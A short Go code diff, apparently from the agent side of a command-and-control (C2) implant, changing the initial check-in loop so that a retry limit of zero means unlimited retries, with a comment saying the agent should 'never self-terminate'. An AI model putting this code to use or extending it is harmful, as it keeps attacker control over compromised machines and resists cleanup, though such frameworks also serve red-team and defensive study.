@@ -85,8 +85,9 @@ func runAgent() {
 	files.Initialize()
 
 	// Phase 6: Initial checkin with exponential backoff retry
+	// maxRetries=0 means unlimited retries (never self-terminate)
 	log.Printf("connecting")
-	for attempt := 0; attempt < cfg.maxRetries; attempt++ {
+	for attempt := 0; cfg.maxRetries == 0 || attempt < cfg.maxRetries; attempt++ {
 		if err := c2.Checkin(agent); err != nil {
 			log.Printf("connect attempt %d: %v", attempt+1, err)
 			backoffMultiplier := 1 << min(attempt, 8)
